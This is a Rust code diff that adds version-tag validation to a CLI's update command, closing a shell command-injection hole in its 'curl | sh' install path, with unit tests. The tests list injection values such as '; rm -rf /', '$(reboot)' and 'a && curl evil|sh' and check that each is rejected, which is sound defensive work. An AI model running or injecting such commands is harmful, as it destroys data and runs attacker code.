@@ -44,7 +44,29 @@ fn classify_install(exe: &Path) -> InstallKind {
 	}
 }
 
+/// Whether `v` is a safe release-tag string. The standalone-install path on
+/// Unix interpolates the version into a `sh -c` command
+/// (`curl … | sh -s -- <v>`), so any value outside this allow-list — shell
+/// metacharacters, whitespace, quotes, `;`, `|`, `$`, backticks — is rejected
+/// to prevent command injection via `run :update --version <tag>`. Release tags
+/// look like `v0.35.0` / `0.35.0`, all covered by `[A-Za-z0-9._-]`.
+fn is_valid_version_tag(v: &str) -> bool {
+	!v.is_empty()
+		&& v.len() <= 64
+		&& v.chars()
+			.all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '-' | '_'))
+}
+
 pub fn cmd_update(version: Option<&str>) {
+	if let Some(v) = version {
+		if !is_valid_version_tag(v) {
+			eprintln!(
+				"Error: invalid version {v:?}. A version tag may contain only letters, digits, '.', '-', and '_' (e.g. v0.35.0)."
+			);
+			process::exit(1);
+		}
+	}
+
 	let exe = match std::env::current_exe() {
 		Ok(p) => p,
 		Err(e) => {
@@ -300,5 +322,41 @@ mod tests {
 	#[test]
 	fn npm_spec_accepts_bare_semver() {
 		assert_eq!(npm_package_spec(Some("0.19.0")), "@runfile/cli@0.19.0");
+	}
+
+	// ── Audit M2: version-tag validation (command-injection guard) ──
+
+	#[test]
+	fn valid_version_tags_accepted() {
+		for v in ["v0.35.0", "0.35.0", "v1.2.3-rc.1", "latest_snapshot", "2024-01-01"] {
+			assert!(is_valid_version_tag(v), "{v} should be valid");
+		}
+	}
+
+	#[test]
+	fn injection_version_tags_rejected() {
+		// Every one of these carries a shell metacharacter that would be
+		// interpreted by the `sh -c "curl … | sh -s -- <v>"` install path.
+		for v in [
+			"; rm -rf /",
+			"$(reboot)",
+			"`id`",
+			"a | sh",
+			"a && curl evil|sh",
+			"a b",  // whitespace
+			"a\nb", // newline
+			"a'b",  // quote
+			"a\"b",
+			"a>b",
+			"", // empty
+		] {
+			assert!(!is_valid_version_tag(v), "{v:?} must be rejected");
+		}
+	}
+
+	#[test]
+	fn overlong_version_tag_rejected() {
+		assert!(!is_valid_version_tag(&"1".repeat(65)));
+		assert!(is_valid_version_tag(&"1".repeat(64)));
 	}
 }
